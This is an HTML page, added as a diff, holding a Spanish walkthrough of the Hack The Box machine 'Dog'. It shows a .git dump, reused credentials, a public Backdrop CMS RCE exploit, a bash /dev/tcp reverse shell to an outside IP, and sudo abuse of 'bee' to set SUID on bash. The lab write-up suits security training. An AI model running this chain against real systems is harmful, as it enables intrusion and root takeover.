@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Dog HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/dog/pasted-20260126213340.png" alt="Dog HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Dog</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>cms</span>
+            <span>backdrop</span>
+            <span>rustscan</span>
+            <span>git-dumper</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Repositorio <code>.git</code> expuesto en un CMS Backdrop</li>
+            <li><code>Explotación</code>: Credenciales reutilizadas para acceder al CMS y desplegar un template PHP malicioso</li>
+            <li><code>Movimiento lateral</code>: Usuarios del sistema y contraseña reutilizada para acceder como <code>john</code></li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre <code>bee</code> para ejecutar código en Backdrop como root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <div class="code-card">
+            <h3>rustscan: Encontramos un CMS -&gt; backdrop vulnerable a RCE con credenciales</h3>
+            <pre><code>rustscan -a dog.htb --no-banner -- -sCV -oN scan.txt
+# También encontramos .git con nikto haciendo Fuzzing</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/dog/pasted-20260126213445.png" alt="Dog HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>.git</h2>
+          <div class="code-card">
+            <h3>Clonar repositorio .git a git_loot</h3>
+            <pre><code>pipx install git-dumper
+git-dumper http://dog.htb/.git git_loot
+# Credenciales en settings.php: root:BackDropJ2024DS2024</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/dog/pasted-20260226205457.png" alt="Dog HTB" />
+          <div class="code-card">
+            <h3>Búsqueda de usuarios</h3>
+            <pre><code># En el repositorio git
+grep -ri "@dog.htb"
+# Usuario encontrado: tiffany@dog.htb
+# Posts en Web encontramos: dogBackDropSystem@dog.htb
+
+# Login Web: tiffany:BackDropJ2024DS2024</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <p><a href="https://github.com/rvizx/backdrop-rce.git">RCE Exploit</a></p>
+          <div class="code-card">
+            <h3>Exploit en python desde venv</h3>
+            <pre><code> git clone https://github.com/rvizx/backdrop-rce.git
+ python -m venv venv
+ source venv/bin/activate
+ pip install -r requirements.txt
+ 
+python exploit.py http://dog.htb tiffany BackDropJ2024DS2024
+# Nos devuelve una shell y nos traemos a penelope la rev_shell
+bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.17.227/444 0&gt;&amp;1"
+
+penelope -p 444</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>www-data -&gt; john</h3>
+            <pre><code># Listar usuarios del sistema y probar a conectarnos con las credenciales anteriores
+cat /etc/passwd
+su john
+# Pass: BackDropJ2024DS2024</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Sudoers</h3>
+            <pre><code># Binario bee: consola que se ejecuta en el cms backdrop
+sudo -l
+    (ALL : ALL) /usr/local/bin/bee
+# Ejecutar bee desde el directorio del cms /var/www/html o con --root
+sudo bee eval "system('whoami');"
+sudo bee --root=/var/www/html eval "system('chmod u+s /bin/bash');"
+bash -p</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>cms</span>
+            <span>backdrop</span>
+            <span>rustscan</span>
+            <span>git-dumper</span>
+            <span>venv</span>
+            <span>bee</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
